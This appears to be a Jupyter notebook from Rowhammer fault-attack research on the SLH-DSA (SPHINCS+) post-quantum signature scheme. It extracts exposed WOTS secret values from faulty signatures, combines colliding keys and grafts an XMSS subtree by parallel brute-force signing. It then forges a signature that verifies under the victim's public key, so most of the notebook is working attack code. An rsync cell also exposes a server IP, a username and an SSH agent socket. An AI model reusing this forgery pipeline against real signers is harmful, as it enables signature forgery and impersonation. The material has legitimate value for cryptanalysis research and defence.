{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c3557aaf",
   "metadata": {},
   "source": [
    "# Config"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0b682cbb",
   "metadata": {},
   "outputs": [],
   "source": [
    "base = \"data/\"\n",
    "#base = \"../victims/sphincsplus/ref/\"\n",
    "sigs_file_base = \"sigs_shake.txt\"\n",
    "keys_file = base + \"keys_shake.txt\"\n",
    "sigs_file = base + sigs_file_base\n",
    "sigs_simulated_file = base + \"sigs_simulated.txt\"\n",
    "\n",
    "params = 'SLH-DSA-SHAKE-256s'\n",
    "\n",
    "sanity_check = True\n",
    "simulate_faults = False\n",
    "filter_sigs  = False\n",
    "use_pickle = True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3c93dfc",
   "metadata": {},
   "outputs": [],
   "source": [
    "!SSH_AUTH_SOCK=/tmp/ssh-XXXXXXBjV56o/agent.34496 SSH_AGENT_PID=34497 rsync -avz --progress jb@141.83.162.134:/home/jb/rowhammer-jb/swage/keys_shake.txt jb@141.83.162.134:/home/jb/rowhammer-jb/swage/sigs_shake.txt data/"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "036914a7",
   "metadata": {},
   "source": [
    "# Setup\n",
    "\n",
    "Install dependencies, define some helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e301996",
   "metadata": {},
   "outputs": [],
   "source": [
    "%pip install -r requirements.txt\n",
    "!python --version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3458976f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from spxplus import ADRS, SLH_DSA, WOTSKeyData\n",
    "\n",
    "slh = SLH_DSA(params)\n",
    "a = slh.a\n",
    "d = slh.d\n",
    "hp = slh.hp\n",
    "n = slh.n\n",
    "k = slh.k\n",
    "lg_w = slh.lg_w\n",
    "len1 = slh.len1\n",
    "len2 = slh.len2\n",
    "w = slh.w"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "917d1671",
   "metadata": {},
   "outputs": [],
   "source": [
    "def print_adrs(adrs: ADRS, end='\\n', verbose=False):\n",
    "    hex = adrs.adrs().hex()\n",
    "    if verbose:\n",
    "        print('LAYER' + ' ' * 4 + \n",
    "              'TREE ADDR' + ' ' * 18 +\n",
    "              'TYP' + ' ' * 6 +\n",
    "              'KADR' + ' ' * 5 +\n",
    "              'PADD = 0')\n",
    "    print(' '.join([hex[i:i+8] for i in range(0, len(hex), 8)]), end=' ')\n",
    "    print(end=end)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e7e1057",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Pickling for compute-intensive data\n",
    "\n",
    "import os\n",
    "\n",
    "def pickle_load(filename: str, or_else) -> dict:\n",
    "    if use_pickle:\n",
    "        import pickle\n",
    "        if os.path.exists(filename):\n",
    "            print(f\"Loading pickle from {filename}.\")\n",
    "            with open(filename, 'rb') as f:\n",
    "                return pickle.load(f)\n",
    "        else:\n",
    "            print(f\"File {filename} not found, creating new one.\")\n",
    "            return pickle_store(filename, or_else)\n",
    "    else:\n",
    "        print(f\"Pickle loading is disabled, using fallback.\")\n",
    "        return or_else()\n",
    "    \n",
    "def pickle_store(filename: str, fn):\n",
    "    if use_pickle:\n",
    "        import pickle\n",
    "        value = fn()\n",
    "        with open(filename, 'wb') as f:\n",
    "            pickle.dump(value, f)\n",
    "        return value\n",
    "    else:\n",
    "        print(f\"Pickle storing is disabled, not saving {filename}.\")\n",
    "        value = fn()\n",
    "        return value"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77b51cba",
   "metadata": {},
   "outputs": [],
   "source": [
    "from typing import Generator\n",
    "\n",
    "def shared_intermediates(v1: WOTSKeyData, valid: WOTSKeyData) -> Generator[tuple[int, int], None, bool]:\n",
    "    if not v1.intermediates or not valid.intermediates:\n",
    "        return False\n",
    "    if v1 == valid:\n",
    "        return False\n",
    "    retval = False\n",
    "    for chain_idx, chain in enumerate(v1.intermediates):\n",
    "        if not chain:\n",
    "            continue\n",
    "        for hash_iter, step in enumerate(chain[1:], start=1):\n",
    "            if step == valid.sig[chain_idx*n:(chain_idx+1)*n]:\n",
    "                retval = True\n",
    "                yield (chain_idx, hash_iter)\n",
    "    return retval\n",
    "\n",
    "def print_arr_w(arr: list[int], width):\n",
    "    print('[ ', end='')\n",
    "    for x in arr:\n",
    "        print(f\"{x:0{width}d}\", end=' ')\n",
    "    print(']')\n",
    "    \n",
    "def valid_sigs_d(groups):\n",
    "    return {adrs: key for adrs, keys in groups.items() for key in keys if key.valid}\n",
    "\n",
    "def hex(s: bytes | None) -> str:\n",
    "    return s.hex() if s else \"None\"\n",
    "\n",
    "def print_key_data(v: WOTSKeyData, adrs: ADRS, pk_seed: bytes, valid_key: WOTSKeyData | None = None, indent=''):\n",
    "    print(indent + (\"Valid\" if v.valid else \"Invalid\" if v.valid == False else \"--\"), end='\\t')\n",
    "    print(indent + v.sig.hex()[:128] + '...')\n",
    "    print(indent + '\\tPK (from tree)\\t' + hex(v.pk))\n",
    "    pk = v.calculate_pk(params, adrs, pk_seed)\n",
    "    print(indent + '\\tPK (calculated)\\t' + hex(pk))\n",
    "    print(indent + f\"\\tWOTS key is part of signature {v.sig_idx}\")\n",
    "    print(indent + '\\t\\t\\t', end='')\n",
    "    print_arr_w([i for i in range(len(v.chains))], 2)\n",
    "    print(indent + '\\t' + \"chains\\t\\t\", end='')\n",
    "    print_arr_w(v.chains, 2)\n",
    "    print(indent + '\\t' + \"chains (calc)\\t\", end = '')\n",
    "    print_arr_w(v.chains_calculated, 2)\n",
    "    if valid_key and not v.valid:\n",
    "        for chain_idx, exposed in shared_intermediates(v, valid_key):\n",
    "            print(indent + f\"\\t\\tExposed {exposed} secret values at chain_idx {chain_idx}\")\n",
    "    \n",
    "\n",
    "def print_groups(pk_seed: bytes, groups: dict[ADRS, list[WOTSKeyData]], skip_no_exposed=True):\n",
    "    #collisions: list[tuple[ADRS, set[WOTSKeyData]]] = [(adrs, value) for adrs, value in collisions if any(v.valid for v in value) and not all(v.valid for v in value)]\n",
    "    #print(f\"Found {len(collisions)} groups with at least one valid and one invalid key\")\n",
    "    # collisions where PK match. This is not necessary. Better: find exposed keys by running WOTS chain\n",
    "    \"\"\"collisions = [\n",
    "        (adrs, value)\n",
    "        for adrs, value in collisions\n",
    "        if any(v1.msg != v2.msg and v1.pk == v2.pk for v1 in value for v2 in value if v1.valid and not v2.valid)\n",
    "    ]\"\"\"\n",
    "    \n",
    "    valid_sigs = valid_sigs_d(groups)\n",
    "\n",
    "    # sort by layer address\n",
    "    groups: list = sorted(groups.items(), key=lambda item: item[0].get_layer_address())\n",
    "    \n",
    "    for adrs, value in groups:\n",
    "        valid_sig = valid_sigs[adrs] if adrs in valid_sigs else None\n",
    "        invalid_sigs = [v for v in value if not v.valid]\n",
    "        print_adrs(adrs, end='', verbose=True)\n",
    "        print(len(value))\n",
    "        \n",
    "        for v in [valid_sig] + invalid_sigs:\n",
    "            if not v:\n",
    "                continue\n",
    "            if skip_no_exposed and not v.valid and not shared_intermediates(v, valid_sig):\n",
    "                continue\n",
    "            print_key_data(v, adrs, pk_seed, valid_sig, indent='\\t')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b6cdc87e",
   "metadata": {},
   "source": [
    "# Clean Start\n",
    "\n",
    "Run this cell (and below) for a clean analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "184c2937",
   "metadata": {},
   "outputs": [],
   "source": [
    "groups: dict[ADRS, set[WOTSKeyData]] = {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5267d42",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load keys\n",
    "with open(keys_file, \"r\") as f:\n",
    "    lines = [s.split(': ') for s in f.readlines()]\n",
    "    keys = {s[0]: bytes.fromhex(s[1].strip()) for s in lines}\n",
    "sk = keys['sk']\n",
    "pk = keys['pk']\n",
    "pk_seed = pk[:n]\n",
    "pk.hex()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a8df11a2",
   "metadata": {},
   "source": [
    "# Update Experiment\n",
    "Run this cell (and below) to process new signatures"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4b3e337",
   "metadata": {},
   "source": [
    "# Load real signatures\n",
    "\n",
    "This loads the real signatures from `sigs_file` (see config)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b562188",
   "metadata": {},
   "outputs": [],
   "source": [
    "from cryptanalysis_lib import extract_wots_keys\n",
    "\n",
    "\n",
    "def load_groups():\n",
    "    with open(sigs_file, \"r\") as f:\n",
    "        sigs = [bytes.fromhex(s.strip()) for s in f.readlines()]\n",
    "        # sigs = sigs[:1000]\n",
    "    print(f\"Processing {len(sigs)} signatures...\", end=' ')\n",
    "    groups = extract_wots_keys(pk, sigs, params)\n",
    "    return sigs, groups\n",
    "\n",
    "sigs, groups = pickle_load(sigs_file_base + \".pkl\", load_groups)\n",
    "print(f\"Loaded {len(sigs)} signatures in {len(groups)} groups\")\n",
    "total_sigs = sum(len(v) for v in groups.values())\n",
    "print(f\"Total signatures in groups: {total_sigs}\")\n",
    "print(f\"valid signatures: {len(set(k.sig_idx for v in groups.values() for k in v if k.valid))}\")\n",
    "print(f\"invalid signatures: {len(set(k.sig_idx for v in groups.values() for k in v if not k.valid))}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a7ad55a2",
   "metadata": {},
   "source": [
    "# Load simulated faulty signatures\n",
    "This section loads simulated faults from `sigs_simulated_file`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9629c0cc",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "from cryptanalysis_lib import merge_groups\n",
    "\n",
    "if simulate_faults:\n",
    "    with open(sigs_simulated_file, \"r\") as f:\n",
    "        faulty_sigs = [bytes.fromhex(s.strip()) for s in f.readlines()]\n",
    "    print(f\"Loaded {len(faulty_sigs)} faulty (simulated) signatures\")\n",
    "    simulated_groups = extract_wots_keys(pk, faulty_sigs)\n",
    "    for adrs, keys in simulated_groups.items():\n",
    "        for key in keys:\n",
    "            key.simulated = True\n",
    "    #print_groups(pk_seed, simulated_groups)\n",
    "    groups = merge_groups(groups, simulated_groups)\n",
    "else:\n",
    "    print(\"Fault simulation disabled or no simulated faulty signatures found\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bc68c8f9",
   "metadata": {},
   "source": [
    "# Tooling sanity check\n",
    "\n",
    "This section tries to generate a signature using the same key and randomization values as the first signature in `sigs_file`.\n",
    "We expect them to match. This assumes that the first signature in `sigs_file` is a valid signature."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "979dec9f",
   "metadata": {},
   "outputs": [],
   "source": [
    "if sanity_check:\n",
    "    wots_len = slh.len\n",
    "    wots_bytes = wots_len * n\n",
    "    xmss_bytes = hp * n\n",
    "    fors_bytes = k*(n + a * n)\n",
    "    sig_len = n + fors_bytes + d * (wots_bytes + xmss_bytes)\n",
    "\n",
    "    sig = sigs[0]\n",
    "\n",
    "    m = sig[sig_len:]\n",
    "    r = sig[:n]\n",
    "    pysig = slh.slh_sign_internal(m, sk, None, r=r, stop_at=None)\n",
    "    pysig += m\n",
    "\n",
    "    if pysig != sig:\n",
    "        print(\"Signature mismatch\")\n",
    "        print(pysig.hex())\n",
    "        print(sig.hex())\n",
    "    else:\n",
    "        print(\"Passed sanity check\")\n",
    "else:\n",
    "    print(\"Skipping sanity check\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a221c424",
   "metadata": {},
   "source": [
    "# Extract WOTS keys\n",
    "\n",
    "Extract all WOTS keys in all signatures"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "05c7a145",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Shows distribution of steps in WOTS chains\n",
    "if False:\n",
    "    # get distribution of steps in (valid) signatures\n",
    "    distr = [[0 for _ in range(16)] for _ in range(67)]\n",
    "    for adrs, keys in groups.items():\n",
    "        for key in keys:\n",
    "            if key.valid:\n",
    "                for chain_idx, chain in enumerate(key.chains):\n",
    "                        distr[chain_idx][chain] += 1           \n",
    "    distr\n",
    "\n",
    "    %pip install matplotlib\n",
    "    import matplotlib.pyplot as plt\n",
    "\n",
    "    # distr is your 67×16 list of counts\n",
    "    # e.g. distr = [[…], …, […]]\n",
    "\n",
    "    plt.figure(figsize=(8, 10))\n",
    "    plt.imshow(distr, aspect='auto')        # default colormap\n",
    "    plt.colorbar(label='Count')              # show scale\n",
    "    plt.xlabel('Step value (0–15)')\n",
    "    plt.ylabel('Chain index (0–66)')\n",
    "    plt.title('Distribution of steps in valid signatures')\n",
    "    plt.tight_layout()\n",
    "    plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c08d3f2",
   "metadata": {},
   "source": [
    "# Group Collisions\n",
    "\n",
    "...appear here!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc2d356f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# sanity check for multiple valid keys\n",
    "for adrs, keys in groups.items():\n",
    "    if len([v for v in keys if v.valid]) > 1:\n",
    "        print(\"ERROR: found multiple valid keys for the same address\", adrs, keys)\n",
    "        raise ValueError(\"Multiple valid keys for the same address\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73ddcca7",
   "metadata": {},
   "outputs": [],
   "source": [
    "# maintain a dictionary of valid signatures per adrs\n",
    "valid_sigs = valid_sigs_d(groups)\n",
    "print(f\"Found {len(valid_sigs)} valid signatures in groups\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1269b684",
   "metadata": {},
   "outputs": [],
   "source": [
    "# only keep keys at target layer\n",
    "target_layer = 7\n",
    "groups = {adrs: sigs for adrs, sigs in groups.items() if adrs.get_layer_address() == target_layer}\n",
    "groups = {adrs: sigs for adrs, sigs in groups.items() if len(sigs) > 0}\n",
    "print(f\"Found {len(groups)} groups at layer {target_layer}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80f52dfe",
   "metadata": {},
   "outputs": [],
   "source": [
    "def max_collisions_by_sig_count(groups: dict[ADRS, set[WOTSKeyData]]):\n",
    "    max_idx = max((key.sig_idx for adrs, keys in groups.items() for key in keys), default=-1)\n",
    "    if max_idx < 0:\n",
    "        return\n",
    "    for idx in range(0, max_idx, 100):\n",
    "        count = max(len(set(key.sig for key in keys if key.sig_idx < idx)) for keys in groups.values())\n",
    "        yield (idx, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2702c085",
   "metadata": {},
   "outputs": [],
   "source": [
    "for c in max_collisions_by_sig_count(groups):\n",
    "    print(f'{c[0]},{c[1]}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d6977a1",
   "metadata": {},
   "outputs": [],
   "source": [
    "# only keep collisions\n",
    "from cryptanalysis_lib import find_collisions\n",
    "\n",
    "\n",
    "groups = find_collisions(groups)\n",
    "print(f\"Found {len(groups)} groups with collisions\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9949068e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# post-process collided WOTS keys\n",
    "def calc_intermediates() -> dict[ADRS, set[WOTSKeyData]]:\n",
    "    global groups\n",
    "    for adrs, keys in groups.items():\n",
    "        if adrs not in valid_sigs:\n",
    "            continue\n",
    "        valid_sig = valid_sigs[adrs]\n",
    "        for key in keys:\n",
    "            key.calculate_intermediates(params, adrs, pk_seed, valid_sig)\n",
    "    return groups\n",
    "        \n",
    "groups: dict[ADRS, set[WOTSKeyData]] = pickle_load(\"groups_intermediates_\" + sigs_file_base + \".pkl\", calc_intermediates)\n",
    "print(f\"Calculated intermediates for {len(groups)} groups\")\n",
    "assert all(s.chains_calculated for _, sigs in groups.items() for s in sigs), \"Not all keys have calculated chains\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "406d23a9",
   "metadata": {},
   "outputs": [],
   "source": [
    "# filter out signatures containing no WOTS secrets\n",
    "groups = {adrs: [sig for sig in sigs if any(i < 17 for i in sig.chains_calculated)] for adrs, sigs in groups.items()}\n",
    "groups = find_collisions(groups)\n",
    "print(f\"Found {len(groups)} groups with at least one WOTS secret\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61b57808",
   "metadata": {},
   "outputs": [],
   "source": [
    "def filter_signatures(sigs: list[bytes], wots_keys: dict[ADRS, set[WOTSKeyData]]) -> set[bytes]:\n",
    "    filtered_sigs = set()\n",
    "    collisions = find_collisions(wots_keys)\n",
    "    collisions = {adrs: sigs for adrs, sigs in collisions.items() if any(sig.valid for sig in sigs) and len(sigs) > 1}\n",
    "    valid_sigs = valid_sigs_d(wots_keys)\n",
    "    for adrs, keys in collisions.items():\n",
    "        for key in keys:\n",
    "            if key.valid:\n",
    "                # keep valid keys\n",
    "                filtered_sigs.add(sigs[key.sig_idx])\n",
    "            if adrs in valid_sigs and shared_intermediates(key, valid_sigs[adrs]):\n",
    "                filtered_sigs.add(sigs[key.sig_idx])\n",
    "    return filtered_sigs\n",
    "\n",
    "if filter_sigs:\n",
    "    # only keep signatures that are valid or have exposed WOTS keys\n",
    "    filtered_sigs = filter_signatures(sigs, groups)\n",
    "    print(f\"Kept {len(filtered_sigs)} of {len(sigs)} signatures\")\n",
    "    with open(\"../sigs_filtered.txt\", \"w\") as f:\n",
    "        for sig in filtered_sigs:\n",
    "            f.write(sig.hex() + \"\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a19de0ee",
   "metadata": {},
   "source": [
    "# Combine WOTS Keys\n",
    "This section combines the collided keys"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "120a2bcd",
   "metadata": {},
   "outputs": [],
   "source": [
    "# filter groups with exposed WOTS secrets\n",
    "groups: dict[ADRS, set[WOTSKeyData]] = {adrs: sigs \n",
    "    for adrs, sigs in groups.items()\n",
    "    if any(not sig.valid and shared_intermediates(sig, valid_sigs[adrs]) for sig in sigs)\n",
    "}\n",
    "print(f\"Found {len(groups)} groups with exposed WOTS secrets\")\n",
    "#print_groups(pk_seed, groups)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f3a036a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Join WOTS keys to get a WOTS key usable for signing as many messages as possible\n",
    "from copy import deepcopy\n",
    "\n",
    "def join_sigs(wots_keys: dict[ADRS, set[WOTSKeyData]], params, pk_seed) -> dict[ADRS, WOTSKeyData]:\n",
    "    joined_sigs = {}\n",
    "    valid_sigs = valid_sigs_d(wots_keys)\n",
    "    for adrs, keys in wots_keys.items():\n",
    "        if len(keys) < 2:\n",
    "            continue\n",
    "        retval = deepcopy(valid_sigs[adrs])\n",
    "        if not retval.chains_calculated:\n",
    "            print_adrs(adrs)\n",
    "            retval.calculate_intermediates(params, adrs, pk_seed, valid_sigs[adrs])\n",
    "        for key in keys:\n",
    "            retval = retval.join(key, params)\n",
    "        joined_sigs[adrs] = retval\n",
    "    return joined_sigs\n",
    "\n",
    "joined_sigs = join_sigs(groups, params, pk_seed)\n",
    "print(f\"Joined {len(joined_sigs)} signatures\")\n",
    "# Filter out signatures with all chains set to 0\n",
    "#joined_sigs = {adrs: key for adrs, key in joined_sigs.items() if any(c > 0 for c in key.chains_calculated)}\n",
    "#print(f\"Filtered {len(joined_sigs)} (wildcard chains)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c32fa79",
   "metadata": {},
   "outputs": [],
   "source": [
    "def score(key: WOTSKeyData) -> int:\n",
    "    from cryptanalysis_worker import signable_messages\n",
    "    msg_chains = key.chains_calculated[:slh.len1]\n",
    "    cksum_chains = key.chains_calculated[slh.len1:]\n",
    "    signable = signable_messages(msg_chains, cksum_chains, w, len1, len2)\n",
    "    return sum(i for (_, i) in signable)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "898b3e8c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import math\n",
    "\n",
    "\n",
    "for adrs, key in sorted(joined_sigs.items(), key=lambda item: score(item[1]), reverse=True):\n",
    "    print_adrs(adrs, verbose=True)\n",
    "    print(\"Score: \", math.log2(score(key)) - math.log2(w**len1))\n",
    "    print_key_data(key, adrs, pk_seed, None)\n",
    "\n",
    "    print(\"=\" * 64)\n",
    "    print(\"All keys for exposed address:\")\n",
    "    print_adrs(adrs, verbose=True)\n",
    "    for key in groups[adrs]:\n",
    "        print_key_data(key, adrs, pk_seed, valid_sigs[adrs])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14dc8602",
   "metadata": {},
   "outputs": [],
   "source": [
    "# calculate number of signinable messages (without checksum)\n",
    "import math\n",
    "\n",
    "def num_signable_messages(key: WOTSKeyData) -> int:\n",
    "    return score(key)\n",
    "tmp = [(a, k) for a, k in joined_sigs.items()]\n",
    "num_signable = [num_signable_messages(k) for _, k in tmp]\n",
    "expected_reps = [(w**len1)/n for n in num_signable]\n",
    "\n",
    "# take the best key in the set\n",
    "most_exposed_adrs, most_exposed_key = tmp[num_signable.index(max(num_signable))]\n",
    "expected_reps_best = min(expected_reps)\n",
    "\n",
    "print([math.log2(r) for r in expected_reps])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a6cef1e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# sign a random message with the exposed key\n",
    "#msg = bytes.fromhex('bc9c6c7892ac9aa558a7ee5ef40a50bed3796a3cc657e88c6cedec7ddffbdad2')\n",
    "#assert most_exposed_key.try_sign(msg, most_exposed_adrs, pk_seed, params)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c70dca9",
   "metadata": {},
   "source": [
    "# Tree Grafting\n",
    "\n",
    "It gets costly from here on. Tread lightly"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "35878c3a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import cryptanalysis_lib as clib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd56ecb9",
   "metadata": {},
   "outputs": [],
   "source": [
    "%timeit clib.sign_worker((1, most_exposed_adrs, most_exposed_key, pk_seed, params))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98254039",
   "metadata": {},
   "outputs": [],
   "source": [
    "#%timeit clib.sign_worker_xmss((1, most_exposed_adrs, most_exposed_key, pk_seed, params))\n",
    "#%timeit clib.treehash_c_shake_256s()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9bc4511",
   "metadata": {},
   "outputs": [],
   "source": [
    "#%timeit clib.sign_worker_xmss_c((1, most_exposed_adrs, most_exposed_key, pk_seed, params))\n",
    "#%timeit clib.treehash_c_sha2_256s()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10acdae2",
   "metadata": {},
   "outputs": [],
   "source": [
    "import math\n",
    "from multiprocessing import Pool\n",
    "from os import cpu_count\n",
    "\n",
    "import concurrent\n",
    "\n",
    "def sign_message_batch_mp(total_msgs, adrs, key, pk_seed, params, num_procs: int = 0):\n",
    "    \"\"\"\n",
    "    Use a process pool to sign `total_msgs` messages *per* (adrs,key).\n",
    "    Returns the first successful message signed by any process.\n",
    "    \"\"\"\n",
    "    if num_procs == 0:\n",
    "        num_procs = cpu_count() or 1\n",
    "\n",
    "    # Split total_msgs into roughly equal chunks per process\n",
    "    per_proc = math.ceil(total_msgs / num_procs)\n",
    "    print(\"Total messages per process:\", per_proc)\n",
    "\n",
    "    # Build one work item per (process x key)\n",
    "    work = [(per_proc, adrs.copy(), key, pk_seed, params) for _ in range(num_procs)]\n",
    "    \n",
    "    with concurrent.futures.ProcessPoolExecutor() as executor:\n",
    "        futures = {executor.submit(clib.sign_worker, work): work for work in work}\n",
    "        \n",
    "        for future in concurrent.futures.as_completed(futures):\n",
    "            try:\n",
    "                result = future.result()\n",
    "                if result:\n",
    "                    # Cancel all other futures\n",
    "                    for f in futures:\n",
    "                        f.cancel()\n",
    "                    return result\n",
    "            except Exception as e:\n",
    "                print(\"Error:\", e)\n",
    "    return None\n",
    "\n",
    "print(f\"Expected repetitions 2^{math.log2(expected_reps_best)}\")\n",
    "if expected_reps_best > 2**37:\n",
    "    raise ValueError(f\"Expected repetitions 2^{math.log2(expected_reps_best)} are too high, aborting\")\n",
    "num_sigs = expected_reps_best * 2\n",
    "\n",
    "print(f\"Signing {num_sigs} messages\")\n",
    "ret = sign_message_batch_mp(num_sigs, most_exposed_adrs, most_exposed_key, pk_seed, params, num_procs=cpu_count()-1)\n",
    "if not ret:\n",
    "    raise ValueError(\"No valid signature found\")\n",
    "xmss_pk, adrs, sk_seed, key = ret\n",
    "print(\"Successfully grafted tree for XMSS PK \" + xmss_pk.hex())\n",
    "print(\"Address\")\n",
    "print_adrs(adrs, verbose=True)\n",
    "print(\"SK seed:\", sk_seed.hex())\n",
    "print(\"PK seed:\", pk_seed.hex())\n",
    "print(\"Key:\", key)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f34864ed",
   "metadata": {},
   "outputs": [],
   "source": [
    "def forge(valid_sig: bytes, sk: bytes, pk: bytes, adrs: ADRS, key: WOTSKeyData, m: bytes, params: str):\n",
    "    slh = SLH_DSA(params)\n",
    "    pk_seed = pk[:slh.n]\n",
    "    pk_root = pk[slh.n:]\n",
    "    top_part = valid_sig[n + fors_bytes + (d-1) * (wots_bytes + xmss_bytes) + wots_bytes:n + fors_bytes + d * (wots_bytes + xmss_bytes)]\n",
    "    forged_sig = None\n",
    "    # find a randomization value R that matches the adrs of the exposed key\n",
    "    addrnd = None\n",
    "    while not addrnd:\n",
    "        addrnd = os.urandom(32)\n",
    "        digest  = slh.h_msg(addrnd, pk_seed, pk_root, m)\n",
    "        (_, i_tree, i_leaf) = slh.split_digest(digest)\n",
    "        hp_m    = ((1 << slh.hp) - 1)\n",
    "        for i in range(1, target_layer-1):\n",
    "            i_leaf = i_tree & hp_m  # i_leaf = i_tree mod 2^h'\n",
    "            i_tree  =   i_tree >> slh.hp  # i_tree >> h'\n",
    "        if i_leaf != adrs.get_layer_address():\n",
    "            #print(f\"Leaf index {i_leaf} in layer {target_layer} does not match target index {adrs.get_key_pair_address()}, retrying...\")\n",
    "            addrnd = None\n",
    "            continue\n",
    "    while not forged_sig:\n",
    "        bottom_part, root = slh.slh_sign_internal(m, sk, addrnd, stop_at=target_layer-1)\n",
    "        pk_seed = pk[:slh.n]\n",
    "        forged_sig = key.try_sign(root, adrs, pk_seed, params)\n",
    "    print(len(bottom_part))\n",
    "    print(len(forged_sig))\n",
    "    print(len(top_part))\n",
    "    return bottom_part + forged_sig + top_part\n",
    "\n",
    "sk_prf = os.urandom(32)\n",
    "_, sk = slh.slh_keygen_internal(sk_seed, sk_prf, pk_seed, params)\n",
    "valid_sig = next(key for key in groups[most_exposed_adrs] if key.valid)\n",
    "\n",
    "wots_bytes = slh.len * n\n",
    "xmss_bytes = hp * n\n",
    "fors_bytes = k * (n + a * n)\n",
    "sig_len = n + fors_bytes + d * (wots_bytes + xmss_bytes)\n",
    "valid_sig = sigs[valid_sig.sig_idx]\n",
    "m = valid_sig[sig_len:]\n",
    "valid_sig = valid_sig[:sig_len]\n",
    "\n",
    "print(f'verifying message \"{m.decode()}\" with valid signature')\n",
    "suc = slh.slh_verify_internal(m, valid_sig, pk, params)\n",
    "print(\"Signature verification result:\", suc)\n",
    "\n",
    "print(f'Signining message \"{m.decode()}\" with compromised key')\n",
    "sig = forge(valid_sig, sk, pk, most_exposed_adrs, most_exposed_key, m, params)\n",
    "print(f'verifying message \"{m.decode()}\" with forged signature')\n",
    "suc = slh.slh_verify_internal(m, sig, pk, params)\n",
    "print(\"Signature verification result:\", suc)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv (3.10.12)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
